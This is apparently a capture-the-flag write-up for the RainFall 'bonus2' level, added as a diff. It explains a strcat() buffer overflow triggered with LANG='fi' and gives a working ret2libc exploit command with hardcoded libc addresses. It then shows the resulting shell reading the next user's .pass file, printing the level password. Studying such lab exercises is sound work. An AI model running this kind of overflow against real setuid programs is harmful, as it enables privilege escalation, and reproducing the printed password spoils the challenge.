@@ -1,0 +1,23 @@
+There is a setuid binary "bonus2" own by bonus3
+
+After disassembling the binary we can see that main() function use the LANG environment variable
+which would be important for the bug to be used
+
+The program take 2 arguments, which are truncated to 40 and 32 bytes respectively and stored in str1 and str2
+
+the isn't a bounds checking on str1, so it can be non-null-terminated
+and therefor appear as str1 and str2 combined so a 72 Bytes buffer
+
+the LANG env variable can be either "fi", "nl" or another value
+
+After we test different value for LANG variable
+we observe that we can overflow enought the text buffer to change return address with the strcat() in greetuser()
+when LANG == "fi"
+
+then we do a ret2libc, as seen in previous levels
+[ data to overflow ] [ system() address ] [ return address ] [ "/bin/sh" address from libc ]
+
+bonus2@RainFall:~$> ./bonus2 'folks, here is the shell you requested !' `python -c 'print "!"*18 + "\x60\xb0\xe6\xb7" + "DUMB" + "\x58\xcc\xf8\xb7"'`
+
+bonus3@RainFall:~$> cat ~bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
